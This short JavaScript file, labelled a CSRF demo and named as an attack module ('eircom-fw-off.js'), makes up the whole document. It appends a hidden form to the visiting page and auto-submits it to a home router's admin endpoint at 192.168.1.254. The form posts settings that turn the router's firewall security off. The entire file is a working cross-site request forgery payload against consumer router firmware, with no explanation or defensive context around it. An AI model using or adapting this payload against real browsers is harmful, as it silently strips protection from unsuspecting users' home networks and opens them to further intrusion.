//CSRF DEMO
var attack_module = 'eircom-fw-off.js';


var data = "<form id='csrfform' action='http://192.168.1.254/Forms/Firewall_DefPolicy_1' method='POST'><input type='hidden' name='FW_SecurityFlag' value='0' /><input type='hidden' name='FW_SecurityChangeCustomFlag' value='0'/><input type='hidden' name='FW_Security' value='4' /><input type='hidden' name='FW_DefPSaveBtn' value='Apply' /></form>"


$('body').append(data);
$('#csrfform').submit();
